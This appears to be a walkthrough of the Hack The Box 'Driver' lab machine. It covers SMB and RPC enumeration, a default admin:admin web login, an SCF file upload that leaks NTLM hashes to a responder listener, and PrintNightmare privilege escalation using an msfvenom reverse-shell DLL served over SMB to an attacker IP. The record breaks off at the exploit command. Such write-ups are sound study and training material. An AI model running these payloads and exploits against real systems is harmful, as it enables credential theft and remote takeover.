## `445/tcp` SMB service
We can neither log in with dumb credentials nor without credentials.
So there's nothing to do except bruteforce and this is not our first scope though.

## `135/tcp` MSRPC service
### Impacket's `rpcdump` result
We see the box can be vulnerable to PrintNightmare (CVE-2021-1675)

```console
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/driver]
â””â”€# impacket-rpcdump @10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

## `80/tcp` HTTP service
`driver.htb` asks us for an admin password at first and accepts `admin:admin`.

Firmware Update button forwards us to `/fw_up.php`, and we see a file upload section there.

![firmwareUpdates](img/firmwareUpdates.png)

At that point, the initial thought of mine was uploading a php reverse shell as you can expect. But no uploads directory existence, so it didn't make sense.

At this point, I learnt a new attack vector for SMB! Grabbing user's password hashes using `scf` files.

# Foothold: Grab user authentication hash using `smb` path in `scf` files

Let's have a look at what an `scf` file actually is.
>SCF stands for Shell Command File and is a file format that supports a very limited set of Windows Explorer commands, such as opening a Windows Explorer window or showing the Desktop. The "Show Desktop" shortcut we all use on a daily basis is an SCF file.

This files are also able to connect an smb share if any given.<br>
The blog post below explains the metodology of abusing this behaviour step by step.

https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

- Start an smb server (or a pre-configured relay, such as `responder`).
- Create an scf file.
- Upload it.
- File gets executed as soon as a user browses in the directory of the file. (Look at the squared area in above screenshot)
- Get your NTLM user hash from your server.

By the way, there's a feature in windows (in linux too) that puts files starts with an '@' symbol before other files. And works for folders too.

#### @f4T1H.scf
```
[Shell]
Command=2
IconFile=\\10.10.14.62\doesnot\exists
[Taskbar]
Command=ToggleDesktop
```

#### `responder -w --lm -v -I tun0`

After uploading the file, we receive an authentication attempt in our `responder`.

# Privilege Escalation: PrintNightmare (CVE-2021-1675)
First things first, generate a windows reverse shell payload using `msfvenom`.

```console
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/driver]
â””â”€# msfvenom -ax64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=10.10.16.42 LPORT=2121 -f dll -o revshell.dll
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 8704 bytes
Saved as: revshell.dll
```

Second things second, clone impacket implementation of PrintNightmare from: https://github.com/cube0x0/CVE-2021-1675

Third things third, start an smb server of your choice (mine is impacket :).

```console
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/driver]
â””â”€# impacket-smbserver -ip 10.10.16.42 f4T1H .             
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Fourth thing fourth, run the exploit with the proper positional arguments.
```console
â”Œâ”€â”€(rootðŸ’€f4T1H)-[~/hackthebox/driver/CVE-2021-1675]
â””â”€# python3 CVE-2021-1675.py DRIVER/tony:liltony@10.10.11.106 '\\10.10.16.42\f4T1H\revshell.dll'
